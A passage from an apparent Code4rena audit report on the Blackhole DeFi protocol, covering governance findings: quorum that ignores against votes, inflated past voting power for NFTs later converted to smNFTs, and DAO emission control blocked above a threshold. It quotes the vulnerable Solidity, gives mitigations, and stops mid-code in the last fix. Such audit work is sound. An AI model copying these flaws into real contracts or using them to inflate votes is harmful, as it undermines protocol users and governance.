<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-419">hakunamatata</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L184-L191">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L184-L191</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L680-L684">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L680-L684</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L138-L155">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L138-L155</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-7"><a class="anchor before" aria-label="finding description and impact 7 permalink" href="#finding-description-and-impact-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>The <code>BlackGovernor</code> should be able to, based on user votes determine the status of the proposal and then execute it. We can see from the code that if proposal succeeds, then the emissions inside the <code>MinterUpgradeable</code> should decrease by 1%, if proposal is defeated it should decrease by 1%, otherwise, if quorum is not reached or the <code>forVotes</code>/<code>againstVotes</code> are not big enough compared to abstain votes (which means proposal state is expired) the emissions should stay the same.</p>
<p>However, when determining the status of the proposal the following check is made:</p>
<pre data-index="72" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// quorum reached is basically a percentage check which is of the number specified in constructor of the L2GovernorVotesQuorumFraction(4) // 4%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">_quorumReached</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">) &amp;&amp; </span><span class="mtk11">_voteSucceeded</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Succeeded</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">} </span><span class="mtk15">else</span><span class="mtk1">  </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">_quorumReached</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">) &amp;&amp; </span><span class="mtk11">_voteDefeated</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Defeated</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">} </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Expired</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>From the code we can see that if quorum is not reached it, the proposal is considered Expired after the voting period has ended. However, due to the fact that <code>_quorumReachedFunction</code> is using ONLY the <code>forVotes</code> and <code>abstainVotes</code>, which is incorrect based on the functionality that protocol wants to introduce, we can imagine the following scenario:</p>
<ul>
<li>The emissions are high, and almost all of the users agree that they should decrease the emissions rate.</li>
<li>99% of votes are <code>againstVotes</code> as almost everybody agrees that emissions should decrease.</li>
<li>
<p>The voting period for the proposal ends</p>
<ul>
<li>User tries to execute the proposal expecting that the emissions rate will decrease as 99% of the votes were against and this amount of votes should meet the quorum.</li>
<li>The function executes but it calculates the state as Expired because according to it quorum has not been reached as against votes DO NOT count into the quorum.</li>
<li>The emissions rate stay the same even though “all” of the voting users agreed that it should decrease.</li>
</ul>
</li>
</ul>
<p>Quorum reached snippet:</p>
<pre data-index="73" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1">  </span><span class="mtk11">_quorumReached</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1">  </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">ProposalVote</span><span class="mtk1">  </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">proposalvote</span><span class="mtk1"> = </span><span class="mtk12">_proposalVotes</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">return</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">quorum</span><span class="mtk1">(</span><span class="mtk11">proposalSnapshot</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">)) &lt;=</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">//@audit NO AGAINST VOTES</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">proposalvote</span><span class="mtk1">.</span><span class="mtk12">forVotes</span><span class="mtk1"> + </span><span class="mtk12">proposalvote</span><span class="mtk1">.</span><span class="mtk12">abstainVotes</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>We can see that evaluation whether quorum was reached or not is incorrect based on the functionality that protocol wants to achieve leading to, for example, decrease of the emissions rate by the <code>BlackGovernor</code> being not possible, when almost everybody agrees to do so. Based on the provided facts, I think this should be Medium severity finding as it disrupts the emissions of the BlackToken.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-20"><a class="anchor before" aria-label="recommended mitigation steps 20 permalink" href="#recommended-mitigation-steps-20"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>When evaluating whether quorum was reached, take against votes into the account.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-41">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-8">lonelybones</a>.</p>
<p>The sponsor team requested that the following note be included: </p>
<blockquote>
<p>This issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.
Reference: <a href="https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L668">https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L668</a></p>
</blockquote>
<hr>
<h2 style="position:relative;" id="m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote"><a class="anchor before" aria-label="m 20 getsmnftpastvotes incorrectly checks for voting power leading to some nfts incorrectly being eligible to vote permalink" href="#m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-274">[M-20] <code>getsmNFTPastVotes</code> incorrectly checks for Voting Power leading to some NFTs incorrectly being eligible to vote</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-423">hakunamatata</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/libraries/VotingBalanceLogic.sol#L20-L43">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/libraries/VotingBalanceLogic.sol#L20-L43</a></p>
<p>The <code>getsmNFTPastVotes</code> function checks what was the voting power of the some account at specific point in time.</p>
<pre data-index="74" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1">  </span><span class="mtk11">getsmNFTPastVotes</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">timestamp</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1">  </span><span class="mtk11">view</span><span class="mtk1">  </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint32</span><span class="mtk1"> </span><span class="mtk12">_checkIndex</span><span class="mtk1"> = </span><span class="mtk12">VotingDelegationLib</span><span class="mtk1">.</span><span class="mtk11">getPastVotesIndex</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">cpData</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">account</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">timestamp</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Sum votes</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">_tokenIds</span><span class="mtk1"> = </span><span class="mtk12">cpData</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">.</span><span class="mtk12">checkpoints</span><span class="mtk1">[</span><span class="mtk12">account</span><span class="mtk1">][</span><span class="mtk12">_checkIndex</span><span class="mtk1">].</span><span class="mtk12">tokenIds</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">votes</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">_tokenIds</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">tId</span><span class="mtk1"> = </span><span class="mtk12">_tokenIds</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (!</span><span class="mtk12">locked</span><span class="mtk1">[</span><span class="mtk12">tId</span><span class="mtk1">].</span><span class="mtk12">isSMNFT</span><span class="mtk1">) </span><span class="mtk15">continue</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Use the provided input timestamp here to get the right decay</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">votes</span><span class="mtk1"> =</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">votes</span><span class="mtk1"> +</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">VotingBalanceLogic</span><span class="mtk1">.</span><span class="mtk11">balanceOfNFT</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">tId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">timestamp</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">votingBalanceLogicData</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">votes</span><span class="mtk1">;</span></span></span></code></pre>
<p>We can see in the snippet above that if specific token is not smNFT <strong>RIGHT NOW</strong> (as locked mapping stores current state of <code>tokenId</code>); it skips its voting power in the calculation. However,  the function <strong>DOES NOT</strong> take into the consideration that specific <code>tokenId</code> can be smNFT right now, but could be permanent/not permanent NFT at <code>timestamp - timestamp</code>. This means that if some NFTs at <code>timestamp X</code> was not-permanent locked position, now it’s smNFT (it is possible inside the VotingEscrow to update NFTs to smNFTs), the voting power from the <code>timestamp X</code> will be added to the <code>votes</code> variable calculation which is incorrect as at this point in time X, the nft WAS NOT smNFT.</p>
<p>The biggest impact here is that <code>BlackGovernor</code> contract uses the <code>getsmNFTPastVotes</code> to determine the voting power of the account at some point in time (and the calculation is incorrect). This leads to some users having calculated bigger voting power than they should have leading to for example proposals being proposed from users who SHOULD NOT have that ability or votes casted using bigger power than actual.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-21"><a class="anchor before" aria-label="recommended mitigation steps 21 permalink" href="#recommended-mitigation-steps-21"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>When calculating check whether at <code>timestamp</code> NFT was actually smNFT.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-64">maxvzuvex</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-55">rayss</a>.</p>
<hr>
<h2 style="position:relative;" id="m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold"><a class="anchor before" aria-label="m 21 governance emission adjustment ignored when weekly emission above tail threshold permalink" href="#m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-270">[M-21] Governance emission adjustment ignored when weekly emission above tail threshold</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-82">vesko210</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-482">codexNature</a> and <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-424">hakunamatata</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/MinterUpgradeable.sol#L169-#L180">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/MinterUpgradeable.sol#L169-#L180</a></p>
<h3 style="position:relative;" id="summary-1"><a class="anchor before" aria-label="summary 1 permalink" href="#summary-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Summary</h3>
<p>The protocol only applies the DAO-controlled <code>tailEmissionRate</code> when the weekly emission drops below <code>TAIL_START</code>. This prevents governance from influencing emissions during the intended phase (epoch ≥ 67), which contradicts the documented behavior and severely limits DAO control.</p>
<h3 style="position:relative;" id="finding-description-11"><a class="anchor before" aria-label="finding description 11 permalink" href="#finding-description-11"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding Description</h3>
<p>In the current implementation of <code>update_period()</code>, the weekly emission is multiplied by <code>tailEmissionRate</code> <strong>only when</strong> <code>_weekly &lt; TAIL_START</code>. This logic is meant to apply the DAO’s voted emission adjustment in the governance-controlled phase (from epoch 67 onwards). However, this condition prevents DAO influence if emissions remain above <code>TAIL_START</code>, effectively locking the emission rate even after governance takes over.</p>
<p>This violates the protocol’s documented guarantee:</p>
<blockquote>
<p>“On and after the 67th epoch, it relies on the Governance DAO. If the DAO votes in favor, it increases by 1% of the previous epoch’s emission; if the proposal is against, emission will decrease by 1%; else it will remain the same.”</p>
</blockquote>
<p>Because the DAO’s control is blocked when <code>_weekly &gt;= TAIL_START</code>, the contract fails to fulfill its core governance mechanism — undermining decentralization, community control, and emission responsiveness.</p>
<h3 style="position:relative;" id="impact-12"><a class="anchor before" aria-label="impact 12 permalink" href="#impact-12"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>The impact is <strong>High</strong>. The protocol enters a governance phase after epoch 66, but the DAO’s vote is ignored unless emissions are below a fixed threshold. This means DAO proposals may appear to pass, but have no effect - creating a false sense of control. It limits emission modulation, disrupts monetary policy, and could erode community trust.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-22"><a class="anchor before" aria-label="recommended mitigation steps 22 permalink" href="#recommended-mitigation-steps-22"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Remove the <code>if (_weekly &lt; TAIL_START)</code> conditional and apply <code>tailEmissionRate</code> unconditionally when <code>epochCount &gt;= 67</code>, as per the documentation.</p>
<pre data-index="75" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> &gt;= </span><span class="mtk12">_period</span><span class="mtk1"> + </span><span class="mtk12">WEEK</span><span class="mtk1"> &amp;&amp; </span><span class="mtk12">_initializer</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">epochCount</span><span class="mtk1">++;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_period</span><span class="mtk1"> = (</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> / </span><span class="mtk12">WEEK</span><span class="mtk1">) * </span><span class="mtk12">WEEK</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">active_period</span><span class="mtk1"> = </span><span class="mtk12">_period</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_weekly</span><span class="mtk1"> = </span><span class="mtk12">weekly</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_emission</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Phase 1: Epochs 1–14 (inclusive) — 3% growth</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">epochCount</span><span class="mtk1"> &lt; </span><span class="mtk7">15</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_weekly</span><span class="mtk1"> = (</span><span class="mtk12">_weekly</span><span class="mtk1"> * </span><span class="mtk12">WEEKLY_GROWTH</span><span class="mtk1">) / </span><span class="mtk12">MAX_BPS</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Phase 2: Epochs 15–66 (inclusive) — 1% growth</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">else</span><span class="mtk1"> </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">epochCount</span><span class="mtk1"> &lt; </span><span class="mtk7">67</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_weekly</span><span class="mtk1"> = (</span><span class="mtk12">_weekly</span><span class="mtk1"> * </span><span class="mtk7">10100</span><span class="mtk1">) / </span><span class="mtk12">MAX_BPS</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Phase 3: Epochs 67+ — DAO governance control via nudge()</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
